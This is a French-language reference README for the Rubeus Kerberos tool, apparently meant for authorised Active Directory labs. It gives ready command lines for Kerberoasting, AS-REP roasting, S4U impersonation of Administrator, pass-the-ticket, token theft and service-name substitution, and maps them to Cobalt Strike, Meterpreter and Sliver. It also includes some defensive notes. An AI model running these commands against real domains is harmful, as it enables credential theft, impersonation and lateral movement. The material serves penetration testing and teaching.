# Rubeus — Kerberos Reference

**Français (par défaut)** · [English version](README.en.md) · [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

## Sommaire

01 - [Vue d’ensemble](#section-01)  
02 - [Inventaire des actions](#section-02)  
03 - [Syntaxe & exécution](#section-03)  
04 - [Inspection des tickets](#section-04)  
05 - [Demande de TGT](#section-05)  
06 - [Demande de TGS](#section-06)  
07 - [Renouvellement](#section-07)  
08 - [Kerberoasting](#section-08)  
09 - [AS-REP Roasting](#section-09)  
10 - [Constrained Delegation / S4U](#section-10)  
11 - [Pass-the-Ticket](#section-11)  
12 - [CreateNetOnly & tokens](#section-12)  
13 - [Surveillance & extraction](#section-13)  
14 - [Golden / Silver / Diamond](#section-14)  
15 - [Autres fonctions](#section-15)  
16 - [Options transversales](#section-16)  
17 - [Dépannage](#section-17)  
18 - [Unconstrained Delegation](#section-18)  
19 - [Service Name Substitution](#section-19)  
20 - [Resource-Based Constrained Delegation](#section-20)  
21 - [TGT Delegation / Forwardable](#section-21)  
22 - [Protocol Transition / Bronze Bit / PKINIT](#section-22)  
23 - [Comprendre le masque userAccountControl](#section-23)  
24 - [Équivalents Cobalt Strike / Meterpreter / Sliver](#section-24)  
25 - [Sources et vérification](#section-25)  
26 - [Générateur Base64 → .kirbi](#section-26)  

<a id="section-01"></a>
## 01 - Vue d’ensemble

Comprendre Rubeus, la portée des commandes et les différences entre outils.

**Objectif —** Rubeus est une suite .NET dédiée à Kerberos et Active Directory. Les C2 manipulent parfois les mêmes tickets via leurs commandes natives, mais ils ne réimplémentent pas nécessairement S4U ou Kerberoasting.
**Règle de lecture —** Les exemples sont conçus pour un laboratoire AD autorisé. Les commandes précédées de Rubeus.exe fonctionnent sous Windows ; les commandes Beacon, Meterpreter et Sliver s’exécutent dans leurs consoles respectives.


[↑ Retour au sommaire](#sommaire)

---


<a id="section-02"></a>
## 02 - Inventaire des actions

Une vue rapide des familles de commandes Rubeus.

**Tickets et sessions —** asktgt, asktgs, renew, ptt, purge, describe, triage, klist, dump, currentluid, logonsession, createnetonly.
**Audit Kerberos —** kerberoast, asreproast, preauthscan, hash, changepw, brute, spray.
**Délégation et avancé —** s4u, tgtdeleg, monitor, harvest, golden, silver, diamond, tgssub, asrep2kirbi, kirbi. Selon la version, les noms et arguments peuvent évoluer.


[↑ Retour au sommaire](#sommaire)

---


<a id="section-03"></a>
## 03 - Syntaxe & exécution

Modes d’exécution et vérification de la version.


**Rubeus · Aide**

```powershell
Rubeus.exe
Rubeus.exe help
Rubeus.exe asktgt /?
```

**Cobalt Strike · Assembly**

```text
execute-assembly C:\Tools\Rubeus.exe klist
```

**Sliver · Assembly**

```text
execute-assembly C:\Tools\Rubeus.exe klist
```

**Meterpreter · Depuis un shell Windows**

```text
shell
C:\Tools\Rubeus.exe klist
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-04"></a>
## 04 - Inspection des tickets

Lister, décrire et comprendre les tickets disponibles.

**Interprétation —** Le TGT est destiné au service krbtgt ; un TGS cible un SPN (par exemple HTTP/web01.lab.local). Le LUID identifie une session de connexion Windows.
**Limites —** Rubeus triage et dump peuvent nécessiter des droits élevés pour examiner d’autres sessions. Des différences existent entre la visibilité des tickets et la possibilité de les utiliser.

**Rubeus · Lister**

```powershell
Rubeus.exe klist
Rubeus.exe triage
Rubeus.exe currentluid
Rubeus.exe logonsession
```

**Rubeus · Décrire**

```powershell
Rubeus.exe describe /ticket:C:\Lab\service.kirbi
```

**Cobalt Strike · Inspection**

```text
shell klist
```

**Meterpreter · Kiwi**

```text
load kiwi
kerberos_ticket_list
```

**Sliver · Inspection système**

```text
execute klist
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-05"></a>
## 05 - Demande de TGT

Utiliser un secret explicitement autorisé pour demander un TGT.

**Flux —** AS-REQ → AS-REP auprès du KDC. Les comptes et tickets utilisés dans les exemples sont fictifs.

**Rubeus · Mot de passe de laboratoire**

```powershell
Rubeus.exe asktgt /user:labuser /password:LabPassword123! /domain:lab.local /dc:dc01.lab.local /nowrap
```

**Rubeus · Certificat (syntaxe à adapter)**

```powershell
Rubeus.exe asktgt /user:labuser /domain:lab.local /certificate:C:\Lab\user.pfx
```

**Metasploit Framework · Module**

```text
use auxiliary/admin/kerberos/get_ticket
show options
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-06"></a>
## 06 - Demande de TGS

Obtenir un ticket de service pour un SPN.

**Flux —** TGS-REQ → TGS-REP avec un TGT valide. La demande de ticket ne garantit pas l’autorisation d’accès au service.

**Rubeus · Service HTTP**

```powershell
Rubeus.exe asktgs /ticket:C:\Lab\user.kirbi /service:HTTP/web01.lab.local
```

**Windows · Ticket de session**

```text
klist
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-07"></a>
## 07 - Renouvellement

Renouveler un TGT possédant le flag renewable.


**Rubeus · Renew**

```powershell
Rubeus.exe renew /ticket:C:\Lab\user.kirbi
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-08"></a>
## 08 - Kerberoasting

Auditer les comptes de service avec SPN.

**Principe —** Un TGS peut être demandé pour un SPN puis analysé hors ligne dans le cadre d’un audit de robustesse des mots de passe.
**Protection —** Préférer les gMSA et les secrets longs et aléatoires ; surveiller les demandes anormales de TGS.

**Rubeus · Inventaire**

```powershell
Rubeus.exe kerberoast /stats
```

**Rubeus · Compte de test**

```powershell
Rubeus.exe kerberoast /user:svc_sql /domain:lab.local /nowrap
```

**Rubeus · Export**

```powershell
Rubeus.exe kerberoast /outfile:kerberoast.txt
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-09"></a>
## 09 - AS-REP Roasting

Auditer les comptes sans préauthentification Kerberos.

**Principe —** Si DONT_REQ_PREAUTH est activé, la réponse AS-REP peut exposer une matière cryptographique utilisable pour un test hors ligne.
**Protection —** Réactiver la préauthentification Kerberos et surveiller les requêtes AS anormales.

**Rubeus · Repérage**

```powershell
Rubeus.exe preauthscan /users:C:\Lab\users.txt /domain:lab.local
```

**Rubeus · Compte de test**

```powershell
Rubeus.exe asreproast /user:labuser /domain:lab.local /format:hashcat
```

**Rubeus · Export**

```powershell
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-10"></a>
## 10 - Constrained Delegation / S4U

Délégation contrainte, protocol transition et RBCD.

**S4U2self —** Un service obtient un ticket au nom d’un utilisateur vers lui-même. Avec protocol transition, il peut fonctionner sans authentification Kerberos initiale du client.
**S4U2proxy —** Le service utilise un ticket admissible pour demander au KDC un ticket vers un autre SPN autorisé.
**Attributs AD —** Délégation contrainte classique : msDS-AllowedToDelegateTo. RBCD : msDS-AllowedToActOnBehalfOfOtherIdentity.
**Sans protocol transition —** Un ticket de service utilisateur préexistant et transférable est nécessaire dans le scénario classique décrit par le labo.

**Rubeus · Avec transition**

```powershell
Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_BASE64> /impersonateuser:Administrator /nowrap
```

**Rubeus · Sans transition**

```powershell
Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_BASE64> /tgs:<TGS_BASE64> /nowrap
```

**LDAP · Détection des machines délégantes**

```text
ldapsearch "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" --attributes samAccountName,msDS-AllowedToDelegateTo
```

**PowerShell · Flag Protocol Transition**

```powershell
[System.Convert]::ToBoolean(16781312 -band 16777216)
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-11"></a>
## 11 - Pass-the-Ticket

Importer et utiliser des tickets Kerberos dans une session.

**Attention —** Un TGS reste lié à un SPN et aux droits de son identité. Un ticket importé n’accorde pas des privilèges universels.

**Rubeus · Import**

```powershell
Rubeus.exe ptt /ticket:C:\Lab\user.kirbi
```

**Cobalt Strike · Import**

```text
kerberos_ticket_use C:\Lab\user.kirbi
```

**Meterpreter · Kiwi**

```text
load kiwi
kerberos_ticket_use C:\Lab\user.kirbi
```

**Sliver · Via Rubeus**

```text
execute-assembly C:\Tools\Rubeus.exe ptt /ticket:C:\Lab\user.kirbi
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-12"></a>
## 12 - CreateNetOnly & tokens

Créer une session réseau distincte et manipuler un token.

**Processus —** createnetonly lance un processus avec LOGON_TYPE 9 (NewCredentials) ; /ticket importe un ticket dans la session correspondante.
**Distinction —** Emprunter le token du processus ne revient pas à récupérer le token original de l’utilisateur indiqué dans le ticket.

**Rubeus · CreateNetOnly**

```powershell
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:<TGS_BASE64>
```

**Cobalt Strike · Token du PID**

```text
ps
steal_token 2080
getuid
rev2self
```

**Meterpreter · Token du PID**

```text
ps
steal_token 2080
getuid
rev2self
```

**Sliver · Identité / token**

```text
ps
impersonate CONTOSO\dyork
rev2self
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-13"></a>
## 13 - Surveillance & extraction

Inventaire avancé des tickets et sessions.

**Risque —** dump, monitor et harvest peuvent exposer des tickets réutilisables. Les droits et protections LSASS limitent ces opérations.
**Équivalence —** Les C2 proposent parfois la collecte de tickets via Kiwi ou une extension, sans équivalence stricte des fonctions de renouvellement automatique.

**Rubeus · Triage**

```powershell
Rubeus.exe triage
```

**Rubeus · Tickets disponibles**

```powershell
Rubeus.exe klist
```

**Meterpreter · Kiwi**

```text
load kiwi
kerberos_ticket_list
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-14"></a>
## 14 - Golden / Silver / Diamond

Familles de tickets forgés : différences conceptuelles.

**Golden —** TGT construit avec le matériel cryptographique associé à krbtgt et les informations du domaine.
**Silver —** TGS construit avec une clé du service ciblé ; portée plus limitée.
**Diamond —** Modification d’un TGT initialement délivré par le KDC, avec les secrets requis.
**Vigilance —** Les vérifications du PAC, les correctifs KDC et les choix de chiffrement peuvent bloquer les méthodes historiques.


[↑ Retour au sommaire](#sommaire)

---


<a id="section-15"></a>
## 15 - Autres fonctions

Compléments de Rubeus et modules disponibles.

**hash —** Calcule des clés Kerberos dérivées d’un mot de passe selon les paramètres requis.
**changepw —** Change un mot de passe à l’aide de Kerberos lorsqu’un contexte valide existe.
**tgssub —** Modifie des champs de service d’un ticket ; ne garantit pas l’acceptation du ticket par le service.
**brute / spray —** Tests d’authentification à risque de verrouillage de comptes ; n’exécuter que sur un périmètre approuvé.
**asrep2kirbi / kirbi —** Conversion et manipulation de structures de tickets Kerberos.

**Rubeus · Hash de test**

```powershell
Rubeus.exe hash /password:LabPassword123! /user:labuser /domain:lab.local
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-16"></a>
## 16 - Options transversales

Paramètres courants à retrouver selon l’action.

**Identité & domaine —** /user, /password, /domain, /dc, /service, /spn, /luid.
**Matériel Kerberos —** /ticket, /tgs, /rc4, /aes128, /aes256, /certificate, /enctype.
**Résultats & transport —** /outfile, /nowrap, /ptt, /ldaps, /ldapfilter, /proxyurl.
**Comportement —** /opsec, /nopac, /debug ; leur prise en charge varie selon l’action et la version.


[↑ Retour au sommaire](#sommaire)

---


<a id="section-17"></a>
## 17 - Dépannage

Erreurs et interprétations les plus fréquentes.

**KDC_ERR_BADOPTION —** Délégation interdite, ticket non forwardable ou options TGS incompatibles.
**KDC_ERR_PREAUTH_FAILED —** Secret incorrect ou problème de préauthentification.
**KDC_ERR_S_PRINCIPAL_UNKNOWN —** SPN cible inconnu.
**KRB_AP_ERR_SKEW —** Décalage horaire entre client et KDC.
**KRB_AP_ERR_MODIFIED —** Problème de clé, SPN ou déchiffrement.
**Access denied —** Authentification potentiellement valide, mais autorisations insuffisantes.


[↑ Retour au sommaire](#sommaire)

---


<a id="section-18"></a>
## 18 - Unconstrained Delegation

Délégation non contrainte : TGT délégués, comptes machines et restrictions Kerberos.

**Principe**

Un service approuvé pour la délégation non contrainte peut recevoir un TGT transféré lorsque l’authentification et les politiques le permettent. Le flag `TRUSTED_FOR_DELEGATION` vaut `524288` (`0x80000`).



Le compte compromis ne reçoit pas automatiquement tous les TGT du domaine : seuls les tickets effectivement délégués et présents dans les sessions accessibles sont concernés.
**Vérifications**

Identifier les comptes machines configurés, contrôler la délégabilité des utilisateurs (Protected Users / AccountNotDelegated), puis vérifier les tickets disponibles. Les contrôleurs de domaine possèdent souvent ce flag sans constituer un chemin exploitable pertinent.

**LDAP · Cobalt Strike**

```text
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName,userAccountControl
```

**PowerShell · Active Directory**

```powershell
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties userAccountControl | Select Name,userAccountControl
```

**Rubeus · Inspection des tickets**

```powershell
Rubeus.exe triage
Rubeus.exe klist
```

**Rubeus · Aide des fonctions d’inspection**

```powershell
Rubeus.exe dump /?
Rubeus.exe monitor /?
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-19"></a>
## 19 - Service Name Substitution

Changer la classe de service d’un ticket : tgssub, /altservice et limites du SPN.

**Principe**

Dans certains tickets Kerberos, le champ `sname` n’est pas couvert de la même manière par les contrôles cryptographiques que d’autres composants. Substituer une classe de service peut être possible lorsque la cible utilise le même secret de service ; ce n’est ni une modification des droits AD ni un accès universel à n’importe quel hôte.
**Deux possibilités Rubeus**

`tgssub` modifie la représentation du service d’un TGS déjà obtenu. L’option `/altservice` effectue une transformation liée à une opération S4U. Vérifier le service réellement accepté et les protections du système.

**Rubeus · tgssub**

```powershell
Rubeus.exe tgssub /ticket:C:\Kerberos\service.kirbi /altservice:cifs /outfile:C:\Kerberos\service-cifs.kirbi
```

**Rubeus · S4U et altservice**

```powershell
Rubeus.exe s4u /user:lon-ws-1$ /ticket:<TGT_BASE64> /msdsspn:ldap/lon-fs-1 /impersonateuser:labuser /altservice:cifs /nowrap
```

**Cobalt Strike · Charger le ticket**

```text
kerberos_ticket_use C:\Kerberos\service-cifs.kirbi
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-20"></a>
## 20 - Resource-Based Constrained Delegation

RBCD : attribution par la ressource cible et utilisation de S4U dans Rubeus.

**Différence avec KCD**

La délégation contrainte classique est définie dans `msDS-AllowedToDelegateTo` sur le compte délégant. La **RBCD** est définie sur la ressource cible via `msDS-AllowedToActOnBehalfOfOtherIdentity`.
**Conditions**

Il faut qu’une autorisation RBCD existe pour le principal concerné (ou qu’un administrateur la configure). Rubeus réalise l’échange de tickets S4U, mais il ne crée pas automatiquement l’ACE correspondante. Les détails de la chaîne dépendent des flags, du DC et du service.

**PowerShell · Examiner RBCD**

```powershell
Get-ADComputer FS01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select Name,msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Rubeus · Vérifier S4U**

```powershell
Rubeus.exe s4u /?
```

**Rubeus · Examiner les tickets produits**

```powershell
Rubeus.exe describe /ticket:C:\Kerberos\service.kirbi
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-21"></a>
## 21 - TGT Delegation / Forwardable

Différencier TGT transféré, TGS et flags Kerberos.

**Notions**

`forwardable` autorise certaines délégations, sous réserve du KDC et des politiques de domaine. Un TGT délégué n’est pas simplement un TGS pour CIFS, HTTP ou MSSQL.
**Vérifications**

Consulter les flags du ticket, la durée de validité, les protections de compte, les SPN et la configuration de délégation. La commande Rubeus `tgtdeleg` est spécifique à un flux de délégation et n’est pas l’équivalent de `klist`.

**Rubeus · Inspection détaillée**

```powershell
Rubeus.exe describe /ticket:C:\Kerberos\user.kirbi
```

**Rubeus · Aide delegation**

```powershell
Rubeus.exe tgtdeleg /?
```

**PowerShell · Comptes non délégables**

```powershell
Get-ADUser -Filter * -Properties AccountNotDelegated | Where-Object AccountNotDelegated | Select SamAccountName
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-22"></a>
## 22 - Protocol Transition / Bronze Bit / PKINIT

Transition de protocole, variantes S4U et protections modernes.

**Protocol Transition**

`TRUSTED_TO_AUTH_FOR_DELEGATION` vaut `16777216` (`0x1000000`). Ce flag autorise, pour la délégation contrainte classique, certains flux S4U2self dont le ticket doit ensuite être utilisable pour S4U2proxy.
**Bronze Bit**

La technique historique CVE-2020-17049 exploitait le traitement du flag `forwardable`. Les correctifs Microsoft et les contrôles KDC changent les conditions ; une option héritée de Rubeus ne prouve pas qu’un contournement reste possible.
**PKINIT et traversée de domaines**

Les options `/certificate`, `/targetdomain` ou `/targetdc` concernent des actions distinctes et dépendent des relations de confiance, des certificats et de la version compilée.

**Rubeus · S4U (aide)**

```powershell
Rubeus.exe s4u /?
```

**Rubeus · PKINIT (aide)**

```powershell
Rubeus.exe asktgt /?
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-23"></a>
## 23 - Comprendre le masque userAccountControl

Pourquoi 16781312 -band 16777216 retourne True et quelles valeurs utiliser.

**Valeur de gauche : 16781312**

C’est la valeur `userAccountControl` lue sur le compte machine dans Active Directory. Elle peut changer : **ne recopie pas systématiquement 16781312**. Lis l’attribut sur l’objet que tu analyses. Dans l’exemple : `16781312 = 16777216 + 4096`.

**Valeur de droite : 16777216**

C’est un masque constant pour `TRUSTED_TO_AUTH_FOR_DELEGATION` (`0x1000000`). Il teste un seul bit de la valeur UAC.

**Opérateur : -band**

ET binaire, pas comparaison d’égalité. `16781312 -band 16777216` retourne `16777216` (non nul) ; la conversion en booléen retourne donc **True**. Si le bit est absent, le résultat est `0` puis **False**.

**PowerShell · Valeur fournie par AD**

```powershell
$uac = (Get-ADComputer -Identity "LON-WS-1" -Properties userAccountControl).userAccountControl
$mask = 16777216  # TRUSTED_TO_AUTH_FOR_DELEGATION
[bool]($uac -band $mask)
```

**PowerShell · Exemple chiffré**

```powershell
[System.Convert]::ToBoolean(16781312 -band 16777216)  # True
[System.Convert]::ToBoolean(4096 -band 16777216)      # False
```

**Cobalt Strike · Lire le UAC**

```text
ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
```


[↑ Retour au sommaire](#sommaire)

---


<a id="section-24"></a>
## 24 - Équivalents Cobalt Strike / Meterpreter / Sliver

Les commandes sont comparées selon leur effet, pas selon leur nom. « Via Rubeus » signifie qu’il n’existe pas d’équivalent natif confirmé. Les commandes Sliver peuvent évoluer selon le build et les extensions installées.


| Action | Cobalt Strike | Meterpreter / Metasploit | Sliver | Remarque |
| --- | --- | --- | --- | --- |
| Exécuter une assembly .NET | execute-assembly C:\Tools\Rubeus.exe klist | shell puis exécution de Rubeus.exe (pas un équivalent mémoire natif) | execute-assembly C:\Tools\Rubeus.exe klist | Exécution de Rubeus, pas équivalence Kerberos native |
| Lister les tickets | shell klist | load kiwi → kerberos_ticket_list | execute klist | Comparable pour inspection, visibilité variable |
| Importer un ticket .kirbi | kerberos_ticket_use C:\Lab\user.kirbi | load kiwi → kerberos_ticket_use C:\Lab\user.kirbi | execute-assembly Rubeus.exe ptt /ticket:... | Sliver : passe par Rubeus, pas commande native certifiée ici |
| Purger les tickets | kerberos_ticket_purge | load kiwi → kerberos_ticket_purge | execute klist purge | Sliver appelle l’outil Windows ; selon session |
| Emprunter un token de processus | steal_token <PID> | steal_token <PID> | impersonate <DOMAINE\utilisateur> | Sliver utilise ici une identité connue, pas un PID : pas strictement équivalent |
| Revenir au token initial | rev2self | rev2self | rev2self | Fonction similaire |
| Créer un token avec mot de passe | make_token DOMAINE\user motdepasse | Pas d’équivalent direct natif établi | make-token DOMAINE\user motdepasse | Même idée de contexte réseau, implémentations distinctes |
| S4U2self / S4U2proxy | execute-assembly Rubeus.exe s4u ... | Rubeus via shell ou module externe | execute-assembly Rubeus.exe s4u ... | Pas de commande native S4U confirmée dans ces C2 |
| Demander TGT / TGS | execute-assembly Rubeus.exe asktgt/asktgs ... | Modules Kerberos Metasploit (msfconsole) | execute-assembly Rubeus.exe asktgt/asktgs ... | Metasploit : pas une commande Meterpreter simple |
| Kerberoasting / AS-REP | execute-assembly Rubeus.exe kerberoast/asreproast | Modules auxiliaires Metasploit ou Rubeus externe | execute-assembly Rubeus.exe kerberoast/asreproast | Équivalence fonctionnelle dépendante des modules |
| Golden Ticket | Fonctions Kerberos/mimikatz selon version | load kiwi → golden_ticket_create (versions compatibles) | Pas d’équivalent natif confirmé | Requiert matériel cryptographique hautement sensible |
| Inspecter fichier ticket | Rubeus describe via execute-assembly | auxiliary/admin/kerberos/inspect_ticket (msfconsole) | Rubeus describe via execute-assembly | Metasploit : module console, pas Meterpreter |


[↑ Retour au sommaire](#sommaire)

---


<a id="section-25"></a>
## 25 - Sources et vérification

Références utiles pour confirmer les options de ta version. Tester les commandes sur ton build avant de les intégrer à une procédure.


- [Rubeus — dépôt officiel ↗](https://github.com/GhostPack/Rubeus)
- [Cobalt Strike — Running Commands ↗](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/review/userguide/content/topics/post-exploitation_running-commands.htm)
- [Cobalt Strike — Trust Relationships ↗](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_trust-relationships.htm)
- [Metasploit — Kiwi commands ↗](https://docs.metasploit.com/api/Rex/Post/Meterpreter/Ui/Console/CommandDispatcher/Kiwi.html)
- [Metasploit — Tickets ↗](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/inspect_ticket.html)
- [Sliver — Aliases and Extensions ↗](https://sliver.sh/docs/?name=Aliases+and+Extensions)

[↑ Retour au sommaire](#sommaire)

---


<a id="section-26"></a>
## 26 - Générateur Base64 → .kirbi

Colle un ticket Base64, indique le chemin de destination et génère le code PowerShell prêt à copier.


```powershell
$ticket = @'
PASTE_BASE64_TICKET_HERE
'@
$path = 'C:\Wanted\Path\ticket.kirbi'
$bytes = [Convert]::FromBase64String(($ticket -replace '\s', ''))
$folder = Split-Path -Parent $path
if ($folder -and -not (Test-Path -LiteralPath $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}
[IO.File]::WriteAllBytes($path, $bytes)
```


[↑ Retour au sommaire](#sommaire)

---
